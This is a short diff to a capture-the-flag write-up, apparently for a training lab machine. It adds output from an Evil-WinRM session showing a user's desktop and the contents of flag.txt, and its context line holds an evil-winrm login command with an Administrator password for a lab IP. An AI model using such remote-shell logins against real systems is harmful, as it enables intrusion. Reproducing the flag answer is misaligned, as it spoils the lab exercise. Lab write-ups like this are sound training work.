@@ -61,5 +61,18 @@ evil-winrm -i 10.129.38.135 -u Administrator -p badminton
 
 
 ![flag](https://user-images.githubusercontent.com/86112651/176484148-b2a47a55-c7e8-45d6-97d1-deb040a295dd.gif)
+Flag found :
+```
+   Directory: C:\Users\mike\Desktop
 
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
+ea81b7afddd03efaa0945333ed147fac
+
+```
 
